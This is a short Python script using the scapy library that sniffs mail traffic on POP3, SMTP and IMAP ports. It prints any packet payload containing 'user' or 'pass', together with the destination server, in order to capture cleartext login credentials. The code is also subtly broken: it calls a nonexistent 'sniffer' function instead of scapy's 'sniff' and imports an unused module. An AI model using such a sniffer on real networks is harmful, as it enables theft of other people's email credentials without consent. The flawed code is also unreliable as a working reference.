import threading
from scapy.all import *

def packetCallback(packet):
    
    if packet[TCP].payload:
        mailPacket = str(packet[TCP].payload)

        if "user" in mailPacket.lower() or "pass" in mailPacket.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[%] %s" % packet[TCP].payload

sniffer(filter = "tcp port 110 or tcp port 25 or tcp port 143", prn = packetCallback, store = 0)
